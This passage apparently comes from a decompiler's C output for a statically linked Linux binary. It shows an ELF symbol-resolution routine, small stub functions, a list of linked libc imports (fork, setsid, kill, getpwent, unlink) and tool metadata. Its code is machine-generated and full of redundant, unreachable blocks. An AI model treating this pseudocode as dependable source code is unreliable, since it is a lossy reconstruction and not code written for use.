                        // 0x807711c
                        if (v20 == -1 || v17 == 0) {
                            // 0x8077123
                            return 0;
                        }
                        // 0x8077143
                        v24 = *(int32_t *)v17;
                        if (v24 == 0) {
                            // 0x8077123
                            return 0;
                        }
                        // 0x807714d
                        v16 = 0;
                        v23 = 0;
                        v22 = 0;
                        v21 = 0;
                        v25 = v24;
                        v26 = v17;
                        v27 = 0;
                        v19 = 0;
                        // branch -> 0x8077182
                        int32_t v29;
                        int32_t v30; // 0x80771b4
                        int32_t v31; // 0x80771df
                        int32_t v32; // 0x80771e1
                        int32_t v33; // 0x807724862
                        while (true) {
                            // 0x8077182
                            v15 = *(int32_t *)(v26 + 4) + v20;
                            int32_t v34; // 0x8077178
                            int32_t v35; // 0x8077178
                            if (v25 == 6) {
                              lab_0x80771b0:
                                // 0x80771b0
                                v16 = v15;
                                v31 = v23;
                                v30 = v15;
                                v32 = v22;
                                v33 = v27;
                                v29 = v19;
                                // branch -> 0x8077178
                            } else {
                              lab_0x807718c:
                                // 0x807718c
                                if (v25 < 7) {
                                    // 0x8077168
                                    if (v25 == 4) {
                                        // 0x80771a2
                                        v31 = v23;
                                        v30 = v21;
                                        v32 = v15;
                                        v33 = v27;
                                        v29 = v19;
                                        // branch -> 0x8077178
                                    } else {
                                        // 0x807716d
                                        v31 = v23;
                                        v30 = v21;
                                        v32 = v22;
                                        v33 = v27;
                                        v29 = v25 == 5 ? v15 : v19;
                                        // branch -> 0x8077178
                                    }
                                  lab_0x8077178_2:
                                    // 0x8077178
                                    v34 = v26 + 8;
                                    v35 = *(int32_t *)v34;
                                    if (v35 == 0) {
                                        // break (via goto) -> 0x80771b4
                                        goto lab_0x80771b4_4;
                                    }
                                    v23 = v31;
                                    v22 = v32;
                                    v21 = v30;
                                    v25 = v35;
                                    v26 = v34;
                                    v27 = v33;
                                    v19 = v29;
                                    // continue -> 0x8077182
                                    continue;
                                } else {
                                    // 0x807718e
                                    if (v25 == 0x6ffffff0) {
                                        // 0x80771a6
                                        v31 = v15;
                                        v30 = v21;
                                        v32 = v22;
                                        v33 = v27;
                                        v29 = v19;
                                        // branch -> 0x8077178
                                        goto lab_0x8077178_2;
                                    } else {
                                        // 0x8077195
                                        v31 = v23;
                                        v30 = v21;
                                        v32 = v22;
                                        v33 = v25 == 0x6ffffffc ? v15 : v27;
                                        v29 = v19;
                                        // branch -> 0x8077178
                                        goto lab_0x8077178_2;
                                    }
                                    // 0x8077178
                                    v34 = v26 + 8;
                                    v35 = *(int32_t *)v34;
                                    if (v35 == 0) {
                                        // break (via goto) -> 0x80771b4
                                        goto lab_0x80771b4_4;
                                    }
                                    v23 = v31;
                                    v22 = v32;
                                    v21 = v30;
                                    v25 = v35;
                                    v26 = v34;
                                    v27 = v33;
                                    v19 = v29;
                                    // continue -> 0x8077182
                                    continue;
                                }
                                // 0x8077178
                                v34 = v26 + 8;
                                v35 = *(int32_t *)v34;
                                if (v35 == 0) {
                                    // break (via goto) -> 0x80771b4
                                    goto lab_0x80771b4_4;
                                }
                                v23 = v31;
                                v22 = v32;
                                v21 = v30;
                                v25 = v35;
                                v26 = v34;
                                v27 = v33;
                                v19 = v29;
                                // continue -> 0x8077182
                                continue;
                            }
                            // 0x8077178
                            v34 = v26 + 8;
                            v35 = *(int32_t *)v34;
                            if (v35 == 0) {
                                // break (via goto) -> 0x80771b4
                                goto lab_0x80771b4_4;
                            }
                            v23 = v31;
                            v22 = v32;
                            v21 = v30;
                            v25 = v35;
                            v26 = v34;
                            v27 = v33;
                            v19 = v29;
                            // continue -> 0x8077182
                        }
                      lab_0x80771b4_4:
                        // 0x80771b4
                        if (v30 == 0 || v29 == 0 || v32 == 0) {
                            // 0x8077123
                            return 0;
                        }
                        int32_t v36 = v33 == 0 ? 0 : v31; // esi
                        int32_t * v37 = (int32_t *)(v32 + 4); // 0x80771e1_0
                        int32_t v38 = *v37; // 0x80771e1
                        int32_t v39 = 0; // ebp
                        if (v38 == 0) {
                            // 0x8077123
                            return 0;
                        }
                        int32_t v40 = 0; // 0x80771e6127
                        int32_t v41 = v30; // 0x807722a125
                      lab_0x80771ee:;
                        int32_t result;
                        while (true) {
                            unsigned char v42 = *(char *)(v41 + 12); // 0x80771ee
                            int32_t v43 = v38; // 0x80771e696
                            int32_t v44; // 0x80772a3
                            int32_t v45; // 0x80772a6
                            if (v42 % 16 < 6) {
                                // 0x8077209
                                if (v42 < 176) {
                                    // 0x807721f
                                    if (*(int16_t *)(v41 + 14) != 0) {
                                        int32_t v46 = *(int32_t *)v41; // 0x807722a
                                        int32_t v47; // 0x80772a3
                                        if (strcmp((char *)(int32_t)str, (char *)(v46 + v29)) != 0) {
                                            // 0x807729d
                                            v47 = v39;
                                            v43 = *v37;
                                            // branch -> 0x80772a3
                                            goto lab_0x80772a3_2;
                                            // 0x8077123
                                            return result;
                                        }
                                        // 0x8077240
                                        if (v36 == 0) {
                                            // 0x8077293
                                            // branch -> 0x8077123
                                            // 0x8077123
                                            return v8 + *(int32_t *)(v16 + 4);
                                        }
                                        int32_t v48 = v39; // 0x8077244
                                        uint16_t v49 = *(int16_t *)(2 * v48 + v36) % 0x8000;
                                        int32_t v50 = v33; // 0x8077275
                                        // branch -> 0x8077261
                                        while (true) {
                                            // 0x8077261
                                            if (*(char *)(v50 + 2) == 1) {
                                                // 0x8077267
                                                if (v49 == *(int16_t *)(v50 + 4) % 0x8000) {
                                                    int32_t v51 = *(int32_t *)(*(int32_t *)(v50 + 12) + v50); // 0x8077278
                                                    if (strcmp(str2, (char *)(v51 + v29)) == 0) {
                                                        // 0x8077293
                                                        // branch -> 0x8077123
                                                        // 0x8077123
                                                        return v8 + *(int32_t *)(v16 + 4);
                                                    }
                                                    // 0x807729d
                                                    v47 = v39;
                                                    v43 = *v37;
                                                    // branch -> 0x80772a3
                                                  lab_0x80772a3_2:
                                                    // 0x80772a3
                                                    v44 = v47 + 1;
                                                    v39 = v44;
                                                    v45 = v16 + 16;
                                                    v16 = v45;
                                                    if (v44 >= v43) {
                                                        // break (via goto) -> 0x8077123
                                                        goto lab_0x8077123_2;
                                                    }
                                                    v40 = v44;
                                                    v38 = v43;
                                                    v41 = v45;
                                                    // continue (via goto) -> 0x80771ee
                                                    goto lab_0x80771ee;
                                                    // 0x8077123
                                                    return result;
                                                }
                                            }
                                            int32_t v52 = *(int32_t *)(v50 + 16); // 0x8077258
                                            if (v52 == 0) {
                                                // 0x80772ae
                                                v47 = v48;
                                                v43 = *v37;
                                                // branch -> 0x80772a3
                                                goto lab_0x80772a3_2;
                                            } else {
                                                // 0x807725f
                                                v50 += v52;
                                                // branch -> 0x8077261
                                                continue;
                                            }
                                        }
                                        // 0x8077123
                                        return result;
                                    }
                                    v43 = v38;
                                } else {
                                    v43 = v38;
                                }
                            }
                            // 0x80772a3
                            v44 = v40 + 1;
                            v39 = v44;
                            v45 = v16 + 16;
                            v16 = v45;
                            if (v44 >= v43) {
                                // break (via goto) -> 0x8077123
                                goto lab_0x8077123_2;
                            }
                            v40 = v44;
                            v38 = v43;
                            v41 = v45;
                            // continue -> 0x80771ee
                        }
                        // 0x8077123
                        return result;
                    }
                    v18 = v12;
                    break;
                }
                case 2: {
                    // 0x8077130
                    // branch -> 0x80770fd
                    v13 = *(int32_t *)(v11 + 4) + v5;
                }
                default: {
                    int32_t v53 = v10 + 1; // 0x80770fd
                    if (v7 <= v53) {
                        v20 = v9;
                        v17 = v13;
                        // 0x807711c
                        if (v20 == -1 || v17 == 0) {
                            // 0x8077123
                            return 0;
                        }
                        // 0x8077143
                        v24 = *(int32_t *)v17;
                        if (v24 == 0) {
                            // 0x8077123
                            return 0;
                        }
                        // 0x807714d
                        v16 = 0;
                        v23 = 0;
                        v22 = 0;
                        v21 = 0;
                        v25 = v24;
                        v26 = v17;
                        v27 = 0;
                        v19 = 0;
                        // branch -> 0x8077182
                        while (true) {
                            // 0x8077182
                            v15 = *(int32_t *)(v26 + 4) + v20;
                            if (v25 == 6) {
                                goto lab_0x80771b0;
                            }
                            goto lab_0x807718c;
                        }
                    } else {
                        v20 = v9;
                        v14 = v53;
                        v18 = v13;
                    }
                    break;
                }
            }
            // 0x8077104
            v9 = v20;
            v10 = v14;
            v11 += (int32_t)*(int16_t *)(v5 + 42);
            v12 = v18;
            // branch -> 0x8077106
        }
    }
    // 0x8077123
    return 0;
}

// Address range: 0x8077584 - 0x807758b
int32_t __restore(void) {
    // 0x8077584
    g1 = 119;
    return 119;
}

// Address range: 0x807758c - 0x8077593
int32_t __restore_rt(void) {
    // 0x807758c
    g1 = 173;
    return 173;
}

// Address range: 0x807779c - 0x80777a7
void _fini(void) {
    // 0x807779c
    abort();
    // UNREACHABLE
}

// --------------- Statically Linked Functions ----------------

// int * __errno_location(void);
// int __libc_start_main(int *(main)(int, char **, char **), int argc, char ** ubp_av, void(* init)(void), void(* fini)(void), void(* rtld_fini)(void), void(* stack_end));
// unsigned long __udivdi3(unsigned long a, unsigned long b);
// unsigned long __umoddi3(unsigned long a, unsigned long b);
// int access(const char * name, int type);
// unsigned int alarm(unsigned int seconds);
// void * calloc(size_t nmemb, size_t size);
// int chdir(const char * path);
// int chmod(const char * file, __mode_t mode);
// int close(int fd);
// int closedir(DIR * dirp);
// void exit(int status);
// int fclose(FILE * stream);
// FILE * fopen64(const char * restrict filename, const char * restrict modes);
// __pid_t fork(void);
// int fputs(const char * restrict s, FILE * restrict stream);
// size_t fread_unlocked(void * restrict ptr, size_t size, size_t n, FILE * restrict stream);
// void free(void * ptr);
// int fseek(FILE * stream, long int off, int whence);
// long int ftell(FILE * stream);
// size_t fwrite(const void * restrict ptr, size_t size, size_t n, FILE * restrict s);
// char * getcwd(char * buf, size_t size);
// __pid_t getpid(void);
// struct passwd * getpwent(void);
// int gettimeofday(struct timeval * restrict tv, __timezone_ptr_t tz);
// int kill(__pid_t pid, int sig);
// int lstat64(const char * restrict file, struct stat64 * restrict buf);
// void * malloc(size_t size);
// int memcmp(const void * s1, const void * s2, size_t n);
// void * memcpy(void * restrict dest, const void * restrict src, size_t n);
// void * memset(void * s, int c, size_t n);
// DIR * opendir(const char * name);
// int printf(const char * restrict format, ...);
// int putchar(int c);
// int puts(const char * s);
// int rand(void);
// struct dirent64 * readdir64(DIR * dirp);
// void * realloc(void * ptr, size_t size);
// void setpwent(void);
// __pid_t setsid(void);
// __sighandler_t signal(int sig, __sighandler_t handler);
// int snprintf(char * restrict s, size_t maxlen, const char * restrict format, ...);
// void srand(unsigned int seed);
// int stat(const char * restrict file, struct stat * restrict buf);
// char * strcat(char * restrict dest, const char * restrict src);
// int strcmp(const char * s1, const char * s2);
// char * strcpy(char * restrict dest, const char * restrict src);
// char * strdup(const char * s);
// size_t strlen(const char * s);
// int strncmp(const char * s1, const char * s2, size_t n);
// char * strrchr(char * s, int c);
// char * strstr(char * haystack, const char * needle);
// long int syscall(long int sysno, ...);
// time_t time(time_t * timer);
// __mode_t umask(__mode_t mask);
// int unlink(const char * name);
// __pid_t wait(__WAIT_STATUS stat_loc);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: gcc (x86_64-unknown-linux-gnu) (4.7.2)
// Detected functions: 566
// Decompiler release: v2.2.1 (2016-09-07)
// Decompilation date: 2017-12-02 17:01:52
